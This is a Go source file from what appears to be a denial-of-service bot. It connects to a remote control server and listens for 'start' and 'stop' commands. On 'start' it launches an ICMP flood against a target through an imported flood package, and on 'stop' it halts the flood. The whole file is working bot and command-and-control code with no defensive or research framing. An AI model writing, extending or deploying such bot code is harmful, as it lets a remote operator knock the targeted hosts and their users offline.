package socket

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"strings"
	"time"

	"bot/internals/flood"
)

func ConnectToServer(address string) (net.Conn, error) {
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return nil, fmt.Errorf("connection failed: %v", err)
	}
	fmt.Println("Connected to server:", address)
	return conn, nil
}

func StartReadingFromServer(conn net.Conn, controlChan chan bool) {
	reader := bufio.NewReader(conn)
	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading from server:", err)
			close(controlChan)
			return
		}

		trimmedMsg := strings.TrimSpace(message)
		fmt.Println("Received from server:", trimmedMsg)

		switch trimmedMsg {
		case "start":
			fmt.Println("Starting flood")
			controlChan <- true
		case "stop":
			fmt.Println("Stopping flood")
			controlChan <- false
		default:
			if strings.HasPrefix(trimmedMsg, "h") {
				fmt.Println("Changing host command received")
			}
		}
	}
}

func RunFlood(controlChan chan bool, target string, sleepTime time.Duration) {
	var floodCtx context.Context
	var floodCancel context.CancelFunc
	running := false

	for cmd := range controlChan {
		if cmd && !running {
			floodCtx, floodCancel = context.WithCancel(context.Background())
			go flood.SendICMPFlood(floodCtx, target, sleepTime)
			running = true
		} else if !cmd && running {
			floodCancel()
			running = false
		}
	}

	if running {
		floodCancel()
	}
}
